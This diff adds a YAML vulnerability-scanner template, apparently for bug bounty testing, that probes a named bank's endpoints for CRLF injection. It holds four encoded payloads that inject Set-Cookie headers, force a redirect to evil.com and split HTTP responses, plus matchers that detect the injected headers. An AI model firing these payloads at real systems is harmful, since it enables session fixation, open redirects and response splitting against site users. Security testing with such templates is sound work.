@@ -1,0 +1,29 @@
+id: alfabank-crlf-injection
+
+info:
+  name: Alfabank - CRLF Injection
+  author: bugbounty
+  severity: medium
+  description: CRLF injection leading to response splitting
+  tags: crlf,injection,alfabank
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/authorized?fromUrl=%0d%0aSet-Cookie:%20admin=true"
+      - "{{BaseURL}}/password/reset?return_url=%0d%0aLocation:%20https://evil.com"
+      - "{{BaseURL}}/user/login?destination=%0d%0aSet-Cookie:sessionid=admin"
+      - "{{BaseURL}}/search/?text=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: admin"
+          - "Location: https://evil.com"
+
+      - type: regex
+        part: header
+        regex:
+          - 'Set-Cookie:.*admin'
